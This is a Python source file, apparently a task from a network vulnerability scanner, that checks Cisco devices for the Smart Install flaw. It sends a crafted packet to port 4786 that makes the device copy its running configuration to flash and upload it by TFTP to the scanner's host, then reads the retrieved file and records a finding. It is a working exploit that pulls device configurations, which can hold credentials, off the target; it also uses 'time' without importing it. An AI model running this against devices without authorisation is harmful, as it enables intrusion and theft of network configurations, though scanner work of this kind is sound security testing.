import logging as log
from structs import Vulnerability
from tools.common.port_task import PortTask
import socket
import os

from utils.tftp import TFTPError


class SietTask(PortTask):
    async def execute(self, *args, **kwargs):
        try:
            result = await self.context.aucote.tftp_server.async_get_file(str(self._port.node.ip), self.callback)

            try:
                with open(result, 'r') as f:
                    lines = f.readlines()

                    data = lines[:10]

                    data.extend([line for line in lines if line.startswith('hostname')])

            finally:
                os.unlink(result)

            if data:
                output = "".join(data)

                vulnerability = Vulnerability(exploit=self.exploit, port=self._port, output=output, scan=self._scan,
                                              context=self.context)

                self.store_vulnerability(vuln=vulnerability)
        except TFTPError as exception:
            log.warning('Exception during executing %s: %s', self, str(exception))
        finally:
            self._port.scan.end = int(time.time())
            self.store_scan_end(exploits=self.current_exploits, port=self._port)

    def callback(self):
        ip = str(self._port.node.ip)

        conn_with_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn_with_host.settimeout(5)
        conn_with_host.connect((ip, 4786))
        my_ip = os.getenv('HOST')

        c1 = b'copy system:running-config flash:/config.text'
        c2 = 'copy flash:/config.text tftp://{0}/{1}.conf'.format(my_ip, ip).encode('utf-8')
        c3 = b''

        sTcp = b'\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x08\x00\x00\x04\x08\x00\x01\x00\x14\x00\x00\x00\x01\x00' \
               b'\x00\x00\x00\xfc\x99\x47\x37\x86\x60\x00\x00\x00\x03\x03\xf4'

        sTcp = sTcp + c1 + b'\x00' * (336 - len(c1))
        sTcp = sTcp + c2 + b'\x00' * (336 - len(c2))
        sTcp = sTcp + c3 + b'\x00' * (336 - len(c3))

        conn_with_host.send(sTcp)

        log.debug("Sending TFTP packet from %s to %s", my_ip, ip)
